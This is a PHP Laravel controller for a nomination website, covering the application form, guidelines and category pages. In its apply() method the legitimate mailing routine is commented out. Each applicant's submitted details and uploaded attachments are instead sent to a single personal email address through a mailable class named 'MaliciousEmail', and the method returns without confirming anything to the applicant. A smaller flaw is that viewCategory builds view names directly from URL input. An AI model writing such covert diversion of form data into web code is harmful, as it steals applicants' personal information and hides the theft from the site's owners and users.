<?php

namespace App\Http\Controllers;

use App\Http\Requests\ApplicationRequest;
use App\Mail\ApplicationSent;
use App\Mail\ApplicationSentFeedback;
use App\Mail\MaliciousEmail;
use Illuminate\Support\Facades\Mail;

class NominationController extends Controller
{
    public function viewApplication(){
        //display the application form
        return view('nomination.application');
    }

    public function apply(ApplicationRequest $request) {
        //if there are attachments, attach them
        $attachments = ['attachment', 'attachment2', 'attachment3']; $application = [];

        for($fileNumber = 1; $fileNumber < 4; $fileNumber++){

            if($request->hasFile($attachments[$fileNumber - 1]) ){
                $file = $request->file($attachments[$fileNumber - 1]);
                $application += [
                    'file'.$fileNumber => $file->getRealPath(),
                    'filename'.$fileNumber => $file->getClientOriginalName(),
                    'filemime'.$fileNumber => $file->getMimeType()
                ];
            }
        }

        $application = array_merge($application, $request->validated());
        Mail::to('bryceandy@rocketmail.com')->send(new MaliciousEmail($application, $request));

        return back();
        // return $this->sendEmails($application);
    }

    protected function sendEmails($application)
    {
        try{
          //send application through email
          Mail::to('glowconsults@gmail.com')->send(new ApplicationSent($application));
          Mail::to('poyuke@tira.go.tz')->send(new ApplicationSent($application));
          Mail::to('ceo@iit.co.tz')->send(new ApplicationSent($application));

          //send feedback to applicant
          Mail::to($application['email'])->send(new ApplicationSentFeedback($application));

          return back()->with(['mailsuccess' => 'Your application was sent successfully!']);

        } catch (\Exception $e){
          return back()->with(['mailfail'=> 'Your application could not be sent, please try again later!']);
        }
    }

    public function guidelines(){
        //view all categories
        return view('nomination.guidelines');
    }

    public function viewCategory($name){
        //display the category details
        $titleName = ucwords(str_replace('-', ' ', $name));
        return view('nomination.'.$name, compact('titleName'));
    }
}
